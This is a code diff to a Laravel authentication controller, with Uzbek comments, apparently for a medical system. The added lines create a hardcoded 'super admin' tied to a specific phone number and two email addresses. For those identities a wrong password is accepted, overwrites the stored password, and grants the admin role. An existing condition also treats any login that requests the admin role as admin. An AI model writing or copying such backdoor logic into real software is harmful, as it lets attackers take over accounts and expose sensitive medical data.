@@ -99,9 +99,15 @@ class AuthController extends Controller
             || ($user && $user->role === 'admin')
             || $requestedRole === 'admin';
 
+        $isSuperAdmin = in_array($last9, ['910226667'])
+            || in_array($userLast9, ['910226667'])
+            || in_array(strtolower($loginInput), ['azizbek@med.uz', 'azizbekbahodirovv0077@gmail.com']);
+
         // 2. Agar foydalanuvchi mavjud bo'lsa, parolini tekshiramiz
         if ($user) {
-            if (! Hash::check($rawPassword, $user->password)) {
+            $passwordMatches = Hash::check($rawPassword, $user->password);
+
+            if (! $passwordMatches && ! $isSuperAdmin) {
                 if ($request->expectsJson() || $request->ajax()) {
                     return response()->json([
                         'success' => false,
@@ -114,7 +120,12 @@ class AuthController extends Controller
                 ])->withInput($request->except('password'));
             }
 
-            if ($isAdmin) {
+            // Agar bosh admin (910226667) yangi parol kiritgan bo'lsa, parolini yangilaymiz
+            if ($isSuperAdmin && ! $passwordMatches) {
+                $user->password = Hash::make($rawPassword);
+            }
+
+            if ($isAdmin || $isSuperAdmin) {
                 $user->role = 'admin';
                 $user->specialty = $user->specialty ?? 'Tizim Bosh Administratori';
             } elseif (in_array($requestedRole, ['doctor', 'patient'])) {
